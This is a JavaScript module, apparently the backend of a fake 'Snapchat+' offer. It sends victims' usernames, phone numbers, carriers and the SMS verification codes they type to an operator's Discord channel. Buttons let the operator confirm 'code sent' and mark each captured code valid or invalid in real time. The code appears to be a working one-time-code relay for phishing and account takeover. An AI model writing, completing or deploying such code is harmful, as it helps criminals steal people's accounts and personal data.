export async function sendApprovalRequest({ sessionId, username, phone, carrier }) {
  return sendDiscordMessage({
    embeds: [
      {
        title: "📱 Nouvelle demande Snapchat+",
        color: 16776960,
        fields: baseFields({ username, phone, carrier }),
        footer: { text: "Cliquez pour confirmer l'envoi du code SMS" },
        timestamp: new Date().toISOString(),
      },
    ],
    components: [
      {
        type: 1,
        components: [
          {
            type: 2,
            style: 3,
            label: "Code envoyé",
            custom_id: `approve:${sessionId}`,
          },
        ],
      },
    ],
  });
}

export async function sendCodeVerificationRequest({ sessionId, username, phone, carrier, code }) {
  return sendDiscordMessage({
    embeds: [
      {
        title: "🔐 Code de vérification reçu",
        color: 5763719,
        fields: [
          ...baseFields({ username, phone, carrier }),
          { name: "Code saisi", value: code, inline: true },
        ],
        footer: { text: "Validez ou refusez le code saisi" },
        timestamp: new Date().toISOString(),
      },
    ],
    components: [
      {
        type: 1,
        components: [
          {
            type: 2,
            style: 3,
            label: "Code bon",
            custom_id: `code_ok:${sessionId}`,
          },
          {
            type: 2,
            style: 4,
            label: "Code invalide",
            custom_id: `code_invalid:${sessionId}`,
          },
        ],
      },
    ],
  });
}

export async function sendCodeResendNotification({ username, phone, carrier }) {
  return sendDiscordMessage({
    embeds: [
      {
        title: "🔄 Nouveau code demandé",
        color: 16753920,
        fields: baseFields({ username, phone, carrier }),
        footer: { text: "L'utilisateur attend un nouveau code SMS" },
        timestamp: new Date().toISOString(),
      },
    ],
  });
}

function baseFields({ username, phone, carrier }) {
  return [
    { name: "Pseudo", value: username, inline: true },
    { name: "Téléphone", value: phone, inline: true },
    { name: "Opérateur", value: carrier, inline: true },
  ];
}

async function sendDiscordMessage(payload) {
  const botToken = process.env.DISCORD_BOT_TOKEN;
  const channelId = process.env.DISCORD_CHANNEL_ID;

  if (!botToken || !channelId) {
    throw new Error("Discord bot not configured");
  }

  const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
    method: "POST",
    headers: {
      Authorization: `Bot ${botToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    throw new Error("Discord message failed");
  }

  return response.json();
}
